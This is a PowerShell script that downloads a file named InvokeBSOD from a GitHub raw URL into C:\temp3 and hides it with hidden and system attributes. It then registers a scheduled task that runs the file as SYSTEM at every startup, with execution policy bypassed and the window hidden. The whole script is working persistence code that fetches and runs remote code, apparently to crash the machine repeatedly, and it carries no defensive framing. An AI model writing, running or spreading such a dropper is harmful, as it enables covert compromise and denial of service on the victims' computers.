# === Auto-Startup Wrapper for InvokeBSOD.ps1 ===

$ScriptPath = "C:\temp3\InvokeBSOD.ps1"
$TaskName = "InvokeBSOD_AutoBoot"

# Ensure directory exists
$scriptDir = Split-Path $ScriptPath
if (-not (Test-Path $scriptDir)) {
    New-Item -Path $scriptDir -ItemType Directory -Force | Out-Null
}

# Download the script from GitHub if not already present
$rawUrl = "https://raw.githubusercontent.com/ramirezrick/powershell-tools/main/InvokeBSOD"
Invoke-WebRequest -Uri $rawUrl -OutFile $ScriptPath -UseBasicParsing

# Hide the script
attrib +h +s $ScriptPath

# Define the scheduled task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings

# Register the scheduled task
Register-ScheduledTask -TaskName $TaskName -InputObject $Task -Force
